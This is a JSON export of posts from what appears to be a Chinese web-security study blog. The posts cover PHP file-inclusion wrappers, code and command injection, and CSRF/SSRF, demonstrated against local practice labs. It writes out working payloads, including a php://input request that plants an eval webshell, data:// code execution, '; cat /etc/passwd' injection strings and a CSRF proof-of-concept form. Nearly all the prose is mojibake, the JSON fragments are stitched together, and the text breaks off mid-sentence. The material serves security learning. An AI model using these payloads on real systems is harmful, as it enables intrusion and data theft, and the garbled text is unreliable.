1http://127.0.0.1/upload-labs/include.php?file=http://127.0.0.1/phpinfo.txt php:// åè®® æ¡ä»¶ï¼š allow_url_fopen:off/on allow_url_include :ä»…php://input php://stdin php://memory php://temp éœ€è¦on ä½œç”¨ï¼šphp:// è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œåœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php://filterå’Œphp://inputï¼Œphp://filterç”¨äºè¯»å–æºç ï¼Œphp://inputç”¨äºæ‰§è¡Œphpä»£ç ã€‚ è¯´æ˜ï¼šPHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼Œå†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚ åè®® ä½œç”¨ php://input å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œåœ¨POSTè¯·æ±‚ä¸­è®¿é—®POSTçš„dataéƒ¨åˆ†ï¼Œåœ¨enctype=&quot;multipart/form-data&quot; çš„æ—¶å€™php://input æ˜¯æ— æ•ˆçš„ã€‚ php://output åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ php://fd (&gt;=5.3.6)å…è®¸ç›´æ¥è®¿é—®æŒ‡å®šçš„æ–‡ä»¶æè¿°ç¬¦ã€‚ä¾‹å¦‚ php://fd/3 å¼•ç”¨äº†æ–‡ä»¶æè¿°ç¬¦ 3ã€‚ php://memory php://temp (&gt;=5.1.0)ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…è£…å™¨çš„æ•°æ®æµï¼Œå…è®¸è¯»å†™ä¸´æ—¶æ•°æ®ã€‚ä¸¤è€…çš„å”¯ä¸€åŒºåˆ«æ˜¯ php://memory æ€»æ˜¯æŠŠæ•°æ®å‚¨å­˜åœ¨å†…å­˜ä¸­ï¼Œè€Œ php://temp ä¼šåœ¨å†…å­˜é‡è¾¾åˆ°é¢„å®šä¹‰çš„é™åˆ¶åï¼ˆé»˜è®¤æ˜¯ 2MBï¼‰å­˜å…¥ä¸´æ—¶æ–‡ä»¶ä¸­ã€‚ä¸´æ—¶æ–‡ä»¶ä½ç½®çš„å†³å®šå’Œ sys_get_temp_dir() çš„æ–¹å¼ä¸€è‡´ã€‚ php://filter (&gt;=5.0.0)ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äºæ•°æ®æµæ‰“å¼€æ—¶çš„ç­›é€‰è¿‡æ»¤åº”ç”¨ã€‚å¯¹äºä¸€ä½“å¼ï¼ˆall-in-oneï¼‰çš„æ–‡ä»¶å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç±»ä¼¼ readfile()ã€file() å’Œ file_get_contents()ï¼Œåœ¨æ•°æ®æµå†…å®¹è¯»å–ä¹‹å‰æ²¡æœ‰æœºä¼šåº”ç”¨å…¶ä»–è¿‡æ»¤å™¨ã€‚ php://filter å‚æ•°è¯¦è§£è¯¥åè®®çš„å‚æ•°ä¼šåœ¨è¯¥åè®®è·¯å¾„ä¸Šè¿›è¡Œä¼ é€’ï¼Œå¤šä¸ªå‚æ•°éƒ½å¯ä»¥åœ¨ä¸€ä¸ªè·¯å¾„ä¸Šä¼ é€’ã€‚å…·ä½“å‚è€ƒå¦‚ä¸‹ï¼š php://filter å‚æ•° æè¿° resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt; å¿…é¡»é¡¹ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ read=&lt;è¯»é“¾çš„è¿‡æ»¤å™¨&gt; å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ*\\ *ï¼‰åˆ†éš”ã€‚ write=&lt;å†™é“¾çš„è¿‡æ»¤å™¨&gt; å¯é€‰é¡¹ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ\\ ï¼‰åˆ†éš”ã€‚ &lt;; ä¸¤ä¸ªé“¾çš„è¿‡æ»¤å™¨&gt; ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ å¯ç”¨çš„è¿‡æ»¤å™¨åˆ—è¡¨ï¼ˆ4ç±»ï¼‰æ­¤å¤„åˆ—ä¸¾ä¸»è¦çš„è¿‡æ»¤å™¨ç±»å‹ï¼Œè¯¦ç»†å†…å®¹è¯·å‚è€ƒï¼šhttps://www.php.net/manual/zh/filters.php å­—ç¬¦ä¸²è¿‡æ»¤å™¨ ä½œç”¨ string.rot13 ç­‰åŒäºstr_rot13()ï¼Œrot13å˜æ¢ string.toupper ç­‰åŒäºstrtoupper()ï¼Œè½¬å¤§å†™å­—æ¯ string.tolower ç­‰åŒäºstrtolower()ï¼Œè½¬å°å†™å­—æ¯ string.strip_tags ç­‰åŒäºstrip_tags()ï¼Œå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾ è½¬æ¢è¿‡æ»¤å™¨ ä½œç”¨ convert.base64-encode &amp; convert.base64-decode ç­‰åŒäºbase64_encode()å’Œbase64_decode()ï¼Œbase64ç¼–ç è§£ç  convert.quoted-printable-encode &amp; convert.quoted-printable-decode quoted-printable å­—ç¬¦ä¸²ä¸ 8-bit å­—ç¬¦ä¸²ç¼–ç è§£ç  å‹ç¼©è¿‡æ»¤å™¨ ä½œç”¨ zlib.deflate &amp; zlib.inflate åœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º gzip å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ï¼Œä½†ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚ bzip2.compress &amp; bzip2.decompress åŒä¸Šï¼Œåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»º bz2 å…¼å®¹æ–‡ä»¶çš„æ–¹æ³•ã€‚ åŠ å¯†è¿‡æ»¤å™¨ ä½œç”¨ mcrypt.* libmcrypt å¯¹ç§°åŠ å¯†ç®—æ³• mdecrypt.* libmcrypt å¯¹ç§°è§£å¯†ç®—æ³• ç¤ºä¾‹ï¼š php://filter/read=convert.base64-encode/resource=[æ–‡ä»¶å]è¯»å–æ–‡ä»¶æºç ï¼ˆé’ˆå¯¹phpæ–‡ä»¶éœ€è¦base64ç¼–ç ï¼‰ 1http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php php://input + [POST DATA]æ‰§è¡Œphpä»£ç  123http://127.0.0.1/include.php?file=php://input[POST DATAéƒ¨åˆ†]&lt;?php phpinfo(); ?&gt; è‹¥æœ‰å†™å…¥æƒé™ï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ 123http://127.0.0.1/include.php?file=php://input[POST DATAéƒ¨åˆ†]&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; å‚è€ƒï¼šhttps://php.net/manual/zh/wrappers.php.php zip:// &amp; bzip2:// &amp; zlib:// åè®® æ¡ä»¶ï¼š allow_url_fopen:off/on allow_url_include :off/on ä½œç”¨ï¼šzip:// &amp; bzip2:// &amp; zlib:// å‡å±äºå‹ç¼©æµï¼Œå¯ä»¥è®¿é—®å‹ç¼©æ–‡ä»¶ä¸­çš„å­æ–‡ä»¶ï¼Œæ›´é‡è¦çš„æ˜¯ä¸éœ€è¦æŒ‡å®šåç¼€åï¼Œå¯ä¿®æ”¹ä¸ºä»»æ„åç¼€ï¼šjpg png gif xxx ç­‰ç­‰ã€‚ ç¤ºä¾‹ï¼š zip://[å‹ç¼©æ–‡ä»¶ç»å¯¹è·¯å¾„]%23[å‹ç¼©æ–‡ä»¶å†…çš„å­æ–‡ä»¶å]ï¼ˆ#ç¼–ç ä¸º%23ï¼‰ å‹ç¼© phpinfo.txt ä¸º phpinfo.zip ï¼Œå‹ç¼©åŒ…é‡å‘½åä¸º phpinfo.jpg ï¼Œå¹¶ä¸Šä¼  1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt compress.bzip2://file.bz2 å‹ç¼© phpinfo.txt ä¸º phpinfo.bz2 å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰ 1http://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2 compress.zlib://file.gz å‹ç¼© phpinfo.txt ä¸º phpinfo.gz å¹¶ä¸Šä¼ ï¼ˆåŒæ ·æ”¯æŒä»»æ„åç¼€åï¼‰ 1http://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz å‚è€ƒï¼šhttp://php.net/manual/zh/wrappers.compression.php data://åè®® æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include :on ä½œç”¨ï¼šè‡ªPHP&gt;=5.2.0èµ·ï¼Œå¯ä»¥ä½¿ç”¨data://æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚ ç”¨æ³•ï¼š 12data://text/plain,data://text/plain;base64, ç¤ºä¾‹ï¼š data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https://åè®® æ¡ä»¶ï¼š allow_url_fopen:on allow_url_include :on ä½œç”¨ï¼šå¸¸è§„ URL å½¢å¼ï¼Œå…è®¸é€šè¿‡ HTTP 1.0 çš„ GETæ–¹æ³•ï¼Œä»¥åªè¯»è®¿é—®æ–‡ä»¶æˆ–èµ„æºã€‚CTFä¸­é€šå¸¸ç”¨äºè¿œç¨‹åŒ…å«ã€‚ ç”¨æ³•ï¼š 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com ç¤ºä¾‹ï¼š 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt phar://åè®®phar://åè®®ä¸zip://ç±»ä¼¼ï¼ŒåŒæ ·å¯ä»¥è®¿é—®zipæ ¼å¼å‹ç¼©åŒ…å†…å®¹ï¼Œåœ¨è¿™é‡Œåªç»™å‡ºä¸€ä¸ªç¤ºä¾‹ï¼š 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt å¦å¤–åœ¨ Black Hat 2018 å¤§ä¼šä¸Šï¼Œç ”ç©¶äººå‘˜å…¬å¸ƒäº†ä¸€æ¬¾é’ˆå¯¹PHPåº”ç”¨ç¨‹åºçš„å…¨æ–°æ”»å‡»æŠ€æœ¯ï¼šphar://åè®®å¯¹è±¡æ³¨å…¥æŠ€æœ¯ã€‚ å› ä¸ºè¯¥åˆ©ç”¨ç‚¹éœ€è¦æ»¡è¶³ä¸€å®šçš„æ¡ä»¶æ‰èƒ½åˆ©ç”¨ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼Œé‡Œé¢çš„demoä¹Ÿéå¸¸è¯¦ç»†ï¼Œç•™ä½œä»¥åä¸“é—¨ç ”ç©¶ä¸€ä¸‹ã€‚ å‚è€ƒæ–‡ç« ï¼šseebug - åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢ æ¶‰åŠèµ„æºï¼š https://www.seebug.org/vuldb/ssvid-98122 https://www.ichunqiu.com/battalion?t=1&amp;r=57475 https://blog.csdn.net/Cheng_May/article/details/78600833 https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"30WEBæ¼æ´-RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´å…¨è§£","slug":"30WEBæ¼æ´-RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´å…¨è§£","date":"2021-09-21T02:34:56.000Z","updated":"2021-09-21T06:00:39.953Z","comments":true,"path":"2021/09/21/30WEBæ¼æ´-RCEä»£ç åŠå‘½ä»¤æ‰§è¡Œæ¼æ´å…¨è§£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/30WEB%E6%BC%8F%E6%B4%9E-RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€åœ¨ Web åº”ç”¨ä¸­æœ‰æ—¶å€™ç¨‹åºå‘˜ä¸ºäº†è€ƒè™‘çµæ´»æ€§ã€ç®€æ´æ€§ï¼Œä¼šåœ¨ä»£ç è°ƒç”¨ ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œå‡½æ•°å»å¤„ç†ã€‚æ¯”å¦‚å½“åº”ç”¨åœ¨è°ƒç”¨ä¸€äº›èƒ½å°†å­—ç¬¦ä¸²è½¬åŒ–æˆä»£ ç çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è€ƒè™‘ç”¨æˆ·æ˜¯å¦èƒ½æ§åˆ¶è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæ¼ æ´ã€‚åŒæ ·è°ƒç”¨ç³»ç»Ÿå‘½ä»¤å¤„ç†ï¼Œå°†é€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ ä»£ç æ‰§è¡Œ RCE æ¼æ´å½¢æˆ å¯æ§å˜é‡ æ¼æ´å‡½æ•° åŸç†ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å½“åšä»£ç æ¥æ‰§è¡Œï¼Œå¦‚æœæˆ‘ä»¬å½“å‰çš„ç½‘ç«™æ˜¯PHPå°±å½“åšPHPè¯­è¨€æ¥æ‰§è¡Œã€‚ æ£€æµ‹ç™½ç›’ ä»£ç å®¡è®¡ é»‘ç›’ æ¼æ‰«å·¥å…· å…¬å¼€æ¼æ´ æ‰‹å·¥çœ‹å‚æ•°å€¼åŠåŠŸèƒ½ç‚¹ ç›¸å…³å‡½æ•°1eval() å°†è¾“å…¥çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œ 1assert() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨ 1call_user_func() æŠŠç¬¬ä¸€å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•° 1call_user_func_array() è°ƒç”¨å›åˆ°å‡½æ•°,å¹¶æŠŠç¬¬ä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›åˆ°å‡½æ•°çš„å‚æ•° 1array_map() ä¸ºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•° é˜²å¾¡ æ•æ„Ÿå‡½æ•°ç¦ç”¨ å˜é‡è¿‡æ»¤æˆ–å›ºå®š WAFäº§å“ æ¡ˆä¾‹æ¼”ç¤ºè¿™é¢˜æ˜¯ä¸€ä¸ªç™½ç›’æµ‹è¯•ï¼Œéœ€è¦ä»£ç å®¡è®¡ è¯¥ä»£ç æ˜¯å°†ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œè§£å¯†ï¼Œç„¶åæ‰§è¡Œè„šæœ¬å‘½ä»¤ è§£å¯†åå‘ç°æ˜¯æ¥æ”¶ä¸€ä¸ªaå‚æ•° ç›´æ¥ä½¿ç”¨?a=lsæ‰§è¡Œå‘½ä»¤ å‘½ä»¤æ‰§è¡Œç³»ç»Ÿ linux windows åŸç†åº”ç”¨åœ¨è°ƒç”¨è¿™äº›å‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ—¶å€™ï¼Œå¦‚æœå°†ç”¨æˆ·çš„è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°å‘½ä»¤è¡Œä¸­ï¼Œåœ¨æ²¡æœ‰è¿‡æ»¤ç”¨æˆ·çš„è¾“å…¥çš„æƒ…å†µä¸‹ï¼Œå°±ä¼šé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ å½¢æˆ å¯æ§å˜é‡ æ¼æ´å‡½æ•° å‘½ä»¤æ‹¼æ¥Linux 12345678910111213A;B A ä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡Œ BA&amp;B A åå°è¿è¡Œï¼ŒA å’Œ B åŒæ—¶æ‰§è¡ŒA&amp;&amp;B A æ‰§è¡ŒæˆåŠŸæ—¶å€™æ‰ä¼šæ‰§è¡Œ B å‘½ä»¤A|B A æ‰§è¡Œçš„è¾“å‡ºç»“æœï¼Œä½œä¸º B å‘½ä»¤çš„å‚æ•°ï¼ŒA ä¸è®ºæ­£ç¡®ä¸å¦éƒ½ä¼šæ‰§è¡Œ B å‘½ä»¤A||B A æ‰§è¡Œå¤±è´¥åæ‰ä¼šæ‰§è¡Œ B å‘½ä»¤`` åå•å¼•å·linuxä¸‹ä¼šå½“åšå‘½ä»¤æ¥æ‰§è¡Œ127.0.0.1 ; cat /etc/passwd 127.0.0.1 &amp; cat /etc/passwd 127.0.0.1 &amp;&amp; cat /etc/passwd 127.0.0.1 | cat /etc/passwd 233 || cat /etc/passwd windows 1234&quot;|&quot;: ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚&quot;||&quot;: å¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºå‡æ‰è¡Œã€‚&quot;&amp;&quot;ï¼š ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥å¯çœŸå¯å‡ã€‚&quot;&amp;&amp;&quot;ï¼š å¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§ è¡Œ,å‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚ phpç›¸å…³å‡½æ•° system(args) æœ‰å›æ˜¾ passthru(args)(æœ‰å›æ˜¾) exec(args) ï¼ˆå›æ˜¾æœ€åä¸€è¡Œ-å¿…é¡»echoè¾“å‡ºï¼‰ shell_exec(args) ï¼ˆæ— å›æ˜¾-å¿…é¡»è¾“å‡ºï¼‰ åå¼•å·ï¼š`` popen(handle,mode)(æ— å›æ˜¾) proc_open(â€˜cmdâ€™,â€˜flagâ€™,â€˜flagâ€™)ï¼ˆæ— å›æ˜¾ï¼‰ $process = proc_open(â€˜dirâ€™,$des,$pipes); echo stream_get_contents($pipes[1]); æ¡ˆä¾‹æ¼”ç¤ºå¢¨è€…å‘½ä»¤æ³¨å…¥æ‰§è¡Œåˆ†æ é€šè¿‡æŠ“åŒ…ç»•è¿‡å‰ç«¯jsæ£€æµ‹ã€‚ä½¿ç”¨;è¿›è¡Œå‘½ä»¤æ‹¼æ¥ 1iipp=127.0.0.1;ls&amp;submit=Ping 1iipp=127.0.0.1;cat&lt;key_21071211676104.php&amp;submit=Ping æˆåŠŸè·å–flag 1mozhe1af4b8cc599a0a837919be1d30d æ¶‰åŠèµ„æºï¼š123456789101112https://www.cnblogs.com/ermei/p/6689005.htmlhttp://blog.leanote.com/post/snowming/9da184ef24bdhttps://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhehttps://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"ä»£ç æ‰§è¡Œ","slug":"ä»£ç æ‰§è¡Œ","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"29WEBæ¼æ´-CSRFåŠSSRFæ¼æ´æ¡ˆä¾‹è®²è§£","slug":"29WEBæ¼æ´-CSRFåŠSSRFæ¼æ´æ¡ˆä¾‹è®²è§£","date":"2021-09-21T02:34:55.000Z","updated":"2021-09-21T06:00:48.995Z","comments":true,"path":"2021/09/21/29WEBæ¼æ´-CSRFåŠSSRFæ¼æ´æ¡ˆä¾‹è®²è§£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/29WEB%E6%BC%8F%E6%B4%9E-CSRF%E5%8F%8ASSRF%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E8%AE%B2%E8%A7%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† CSRFæ¼æ´ ä»€ä¹ˆæ˜¯CSRFCSRFï¼ˆCross-site request forgeryï¼‰ï¼Œä¸­æ–‡åç§°ï¼šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼Œä¹Ÿè¢«ç§°ä¸ºï¼šone click attack/session ridingï¼Œç¼©å†™ä¸ºï¼šCSRF/XSRFã€‚ CSRFå¯ä»¥åšä»€ä¹ˆä½ è¿™å¯ä»¥è¿™ä¹ˆç†è§£CSRFæ”»å‡»ï¼šæ”»å‡»è€…ç›—ç”¨äº†ä½ çš„èº«ä»½ï¼Œä»¥ä½ çš„åä¹‰å‘é€æ¶æ„è¯·æ±‚ã€‚CSRFèƒ½å¤Ÿåšçš„äº‹æƒ…åŒ…æ‹¬ï¼šä»¥ä½ åä¹‰å‘é€é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç›—å–ä½ çš„è´¦å·ï¼Œç”šè‡³äºè´­ä¹°å•†å“ï¼Œè™šæ‹Ÿè´§å¸è½¬è´¦â€¦â€¦é€ æˆçš„é—®é¢˜åŒ…æ‹¬ï¼šä¸ªäººéšç§æ³„éœ²ä»¥åŠè´¢äº§å®‰å…¨ã€‚ æ”»å‡»æµç¨‹ç”¨æˆ·ç™»å½•ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç«™ï¼Œå¹¶ä¸”æœ¬åœ°ç”Ÿæˆäº†è‡ªå·±çš„Cookieï¼Œç„¶ååœ¨ä¸å…³é—­è¯¥ç½‘ç«™çš„å‰æä¸‹ï¼Œç”¨æˆ·è®¿é—®äº†é»‘å®¢çš„ç½‘ç«™ï¼Œé»‘å®¢é€šè¿‡ä¼ªé€ æ•°æ®åŒ…ï¼Œå‘æ­£å¸¸ç½‘ç«™å‘èµ·è¯·æ±‚ï¼Œä»è€Œé€ æˆäº†CSRFæ”»å‡»ã€‚ æ¡ˆä¾‹æ¼”ç¤ºé¦–å…ˆæˆ‘ä»¬éœ€è¦æŠ“å–åˆ°æ­£å¸¸æ•°æ®åŒ… 1&lt;script src=&#x27;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=b232oy&amp;phonenum=aaaaaaa&amp;add=chain&amp;email=vince%40pikachu.com&amp;submit=submit&#x27;&gt;&lt;/script&gt; ä½¿ç”¨å…¶ä»–æµè§ˆå™¨å‘é€ä¸Šè¿°ä»£ç ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸ŠIPåœ°å€ è¿™é‡Œæˆ‘æ˜¯é€šè¿‡å°†ä»£ç å†™åˆ°htmlæ–‡æœ¬é‡Œï¼Œè®¿é—®htmlè§¦å‘ä»£ç  ä¹Ÿå¯ä»¥ä½¿ç”¨burpè‡ªåŠ¨ç”Ÿæˆcsrfä»£ç  1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;boy&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;23232&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;chain&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;vince&amp;#64;pikachu&amp;#46;com&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; å°†ä¸Šè¿°ä»£ç å†™åˆ°htmlæ–‡ä»¶ä¸­ï¼Œä¸€æ ·å¯ä»¥è§¦å‘CSRFæ¼æ´ã€‚ CSRFé˜²å¾¡1ã€å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç 2ã€è®¾ç½®éšæœº Token3ã€æ£€éªŒ referer æ¥æºï¼Œè¯·æ±‚æ—¶åˆ¤æ–­è¯·æ±‚é“¾æ¥æ˜¯å¦ä¸ºå½“å‰ç®¡ç†å‘˜æ­£åœ¨ä½¿ç”¨çš„é¡µé¢ï¼ˆç®¡ç†å‘˜åœ¨ç¼–è¾‘æ–‡ç« ï¼Œ é»‘å®¢å‘æ¥æ¶æ„çš„ä¿®æ”¹å¯†ç é“¾æ¥ï¼Œå› ä¸ºä¿®æ”¹å¯†ç é¡µé¢ç®¡ç†å‘˜å¹¶æ²¡æœ‰åœ¨æ“ä½œï¼Œæ‰€ä»¥æ”»å‡»å¤±è´¥ï¼‰4ã€è®¾ç½®éªŒè¯ç 5ã€é™åˆ¶è¯·æ±‚æ–¹å¼åªèƒ½ä¸º POST å¦‚æœåœ¨æµ‹è¯•CSRFä¸­ï¼Œæ•°æ®åŒ…æœ‰tokenï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰è¯¥æ¼æ´çš„ã€‚ SSRFæ¼æ´ä»€ä¹ˆæ˜¯SSRFSSRF (Server-Side Request Forgery) å³æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œä»å­—é¢æ„æ€ä¸Šç†è§£å°±æ˜¯ä¼ªé€ ä¸€ä¸ªæœåŠ¡ç«¯è¯·æ±‚ï¼Œä¹Ÿå³æ˜¯è¯´æ”»å‡»è€…ä¼ªé€ 